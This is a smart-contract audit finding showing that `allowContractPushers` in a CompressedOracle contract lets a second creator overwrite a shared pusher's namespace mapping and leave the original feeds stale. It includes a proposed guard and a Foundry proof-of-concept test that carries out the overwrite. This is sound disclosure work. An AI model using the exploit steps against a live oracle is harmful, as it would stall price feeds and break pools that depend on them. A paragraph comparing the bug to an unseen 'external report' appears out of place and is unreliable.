### Title
`allowContractPushers` Silently Overwrites an Existing Namespace Mapping, Redirecting a Shared Pusher's Writes and Staling Live Oracle Feeds - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`CompressedOracleV1.allowContractPushers` does not check whether `namespaceRemapping[pusher]` is already set to a different creator. Any second creator for whom the pusher contract's `isPusher()` returns `true` can silently overwrite the existing mapping, redirecting all future slot writes to their own namespace and leaving the original creator's feeds permanently stale.

---

### Finding Description

`allowContractPushers` proves consent via a live `isPusher(creator)` staticcall and then unconditionally writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    ...
    (bool ok, bytes memory res) = pusher.staticcall(
        abi.encodeWithSignature("isPusher(address)", msg.sender)
    );
    require(ok);
    bool allowed = abi.decode(res, (bool));
    require(allowed);

    namespaceRemapping[pusher] = msg.sender;   // ← no guard on existing value
    emit PusherAuthorized(pusher, msg.sender);
}
``` [1](#0-0) 

There is no check of the form `require(namespaceRemapping[pusher] == address(0) || namespaceRemapping[pusher] == msg.sender)`. The `fallback` push path resolves the target namespace at call time from this single-slot mapping:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
...
namespace := shl(96, creator)
``` [2](#0-1) 

Once the mapping is overwritten, every subsequent push from the pusher contract lands in the new creator's namespace. The original creator's slots receive no further updates.

The analog to the external report is exact: just as two different `srcChain`/`srcAddr` pairs could produce the same `txnHash` and the later transaction would overwrite the earlier one's approval state, two different creators can claim the same pusher address as their mapping key, with the later `allowContractPushers` call silently overwriting the earlier one's namespace binding.

---

### Impact Explanation

- The original creator's oracle feeds stop receiving updates. Their slots retain the last-pushed price and timestamp.
- Any pool or `AnchoredPriceProvider` consuming those feeds will eventually cross the `maxTimeDrift` staleness threshold, causing every `getBidAndAskPrice` call to revert or return a stale quote.
- This maps to **bad-price execution** (stale bid/ask reaches a pool swap) and **broken core pool functionality** (pool becomes unusable for swaps/withdrawals once the oracle is considered stale).
- The original creator cannot recover via `removePushers` because that function checks `namespaceRemapping[pusher] == msg.sender`, which is now false. [3](#0-2) 

---

### Likelihood Explanation

The trigger requires a pusher contract whose `isPusher(address)` returns `true` for more than one creator. This is a realistic production scenario for any shared or multi-tenant pusher service (e.g., a single on-chain relay contract that serves multiple feed creators). The call is fully permissionless — any EOA can invoke `allowContractPushers` with no privileged role. No malicious initial setup is required; the attacker only needs to call the public function after the victim's mapping is established.

---

### Recommendation

Add a guard that prevents overwriting an existing mapping to a different creator:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    uint256 l = pushers.length;
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];
        if (pusher == msg.sender) revert NoSelfRemapping();

        // Prevent silent overwrite of an existing delegation
        address existing = namespaceRemapping[pusher];
        require(existing == address(0) || existing == msg.sender, "already delegated");

        (bool ok, bytes memory res) = pusher.staticcall(
            abi.encodeWithSignature("isPusher(address)", msg.sender)
        );
        require(ok);
        bool allowed = abi.decode(res, (bool));
        require(allowed);

        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

This mirrors the protection already implicit in `allowPushers` (EOA path), where the EIP-191 signature binds the pusher to exactly one creator per signed message.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

// Shared pusher that consents to any creator (realistic for a relay service)
contract SharedPusher {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract NamespaceOverwritePoC is Test {
    CompressedOracleV1 oracle;
    SharedPusher pusher;
    address creatorA = address(0xAAAA);
    address creatorB = address(0xBBBB);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = new SharedPusher();
        vm.warp(1_700_000_000);
    }

    function testNamespaceOverwrite() public {
        // Step 1: Creator A registers the shared pusher
        vm.prank(creatorA);
        address[] memory p = new address[](1);
        p[0] = address(pusher);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusher)), creatorA);

        // Step 2: Creator A's feeds are live — pusher writes to slot 0
        uint56 ts1 = uint56(block.timestamp * 1000);
        uint48 raw1 = (uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(5);
        uint256 word1 = (uint256(ts1) << 8) | uint256(0); // slotId=0
        word1 |= uint256(raw1) << 208;
        vm.prank(address(pusher));
        (bool ok,) = address(oracle).call(abi.encodePacked(word1));
        assertTrue(ok);

        // Verify Creator A's feed has data
        bytes32 feedA = oracle.feedIdOf(creatorA, 0, 0);
        assertGt(oracle.getOracleData(feedA).price, 0);

        // Step 3: Creator B silently overwrites the mapping
        vm.prank(creatorB);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusher)), creatorB); // overwritten!

        // Step 4: Pusher's next write goes to Creator B's namespace, not A's
        uint56 ts2 = uint56((block.timestamp + 1) * 1000);
        uint48 raw2 = (uint48(9_999_999) << 16) | (uint48(3) << 8) | uint48(5);
        uint256 word2 = (uint256(ts2) << 8) | uint256(0);
        word2 |= uint256(raw2) << 208;
        vm.prank(address(pusher));
        (ok,) = address(oracle).call(abi.encodePacked(word2));
        assertTrue(ok);

        // Creator A's feed is now stale (timestamp unchanged from ts1)
        assertEq(
            oracle.getOracleData(oracle.feedIdOf(creatorA, 0, 0)).price,
            U64x32.decode(uint32(raw1 >> 16)) // still old price
        );
        // Creator B's feed received the new write
        assertGt(oracle.getOracleData(oracle.feedIdOf(creatorB, 0, 0)).price, 0);

        // Creator A can no longer remove the pusher (mapping no longer points to A)
        vm.prank(creatorA);
        vm.expectRevert();
        oracle.removePushers(p);
    }
}
